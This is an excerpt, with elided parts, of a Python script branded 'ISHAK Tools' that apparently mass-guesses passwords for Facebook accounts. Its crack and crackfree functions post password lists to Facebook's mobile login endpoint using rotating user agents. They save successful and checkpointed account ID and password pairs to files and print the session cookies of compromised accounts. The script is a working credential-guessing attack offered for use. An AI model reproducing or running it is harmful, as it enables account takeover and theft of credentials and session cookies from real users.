...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/ISHAK.King.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
os.system('espeak -a 300 " Welcome,   to,  ISHAK,  ,  Tools"')
pass
...
def menu():
    ...
    if ISHAK in ['111']:
        ...
        os.system('xdg-open https://www.facebook.com/ISHAK.khadka.587')
        os.system("python nono.py")
    elif ISHAK in ['3','03']:
        result()
    elif ISHAK in ['0']:
...
def passwrd():
    ...
    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mJAY ISHAK VAN Speed Up KO LAAGI')
    print('\033[0;97m===============================================')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}•[ISHAKM1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[ISHAK-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[ISHAK-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " ISHAK,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[ISHAK-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•ISHAK-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•ISHAK-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  ISHAK,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
